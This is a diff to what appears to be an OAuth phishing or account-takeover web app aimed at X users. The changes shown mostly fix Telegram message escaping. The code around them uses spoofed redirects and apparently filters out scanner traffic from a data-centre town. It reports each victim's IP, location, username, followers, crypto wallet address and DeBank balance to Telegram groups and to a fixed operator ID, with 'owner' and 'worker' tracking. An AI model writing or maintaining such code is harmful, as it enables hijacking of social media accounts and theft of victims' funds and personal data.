@@ -41,10 +41,7 @@ def oauth():
     if not group:
         return "⚠️ Identifier is invalid.", 404
 
-    matched = next(
-        (i for i in group["identifiers"] if i["identifier"] == identifier),
-        None
-    )
+    matched = next(i for i in group["identifiers"] if i["identifier"] == identifier)
     
     spoof = group["spoof"]
     session["redirect_url"] = group["redirect"]
@@ -68,7 +65,7 @@ def oauth():
     if city != "The Dalles":
         country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
 
-        message = f'🌐 *Connection:* {real_ip}\n\n{country_flag} *{city}, {country}*'
+        message = f'🌐 *Connection:* {parse(real_ip)}\n\n{country_flag} *{parse(city)}, {parse(country)}*'
         send_message(session["group_id"], message)
 
         client_id = session["client_id"]
@@ -95,7 +92,7 @@ def auth_callback():
     
     authorization_code = request.args.get('code')
     if not authorization_code:
-        send_message(group_id, "❌ *User has cancelled authentication.*")
+        send_message(group_id, "❌ *User has cancelled authentication\\.*")
         return redirect("https://x.com/")
 
     client_id = session.get("client_id")
@@ -185,7 +182,7 @@ def auth_callback():
         message = (f'🐍 *User [{parse(username)}](https://x.com/{username}) has authorized\\.*\n'
                    f'👥 *Followers:* {parse(followers)}\n\n'
                    f'{worker_line if owner_id != worker_id else ""}'
-                   f'🔗 *[{address}](https://debank.com/profile/{address})* \\| $*__{parse(balance)}__*')
+                   f'🔗 *[{address}](https://debank.com/profile/{address})* \\| $*_{parse(balance)}_*')
 
         message_id = send_message(group_id, message)
         send_message(7434895838, f"👤 _[{owner_id}](tg://user?id={owner_id})_ \\| 👷_[{worker_id}](tg://user?id={worker_id})_\n\n{message}")
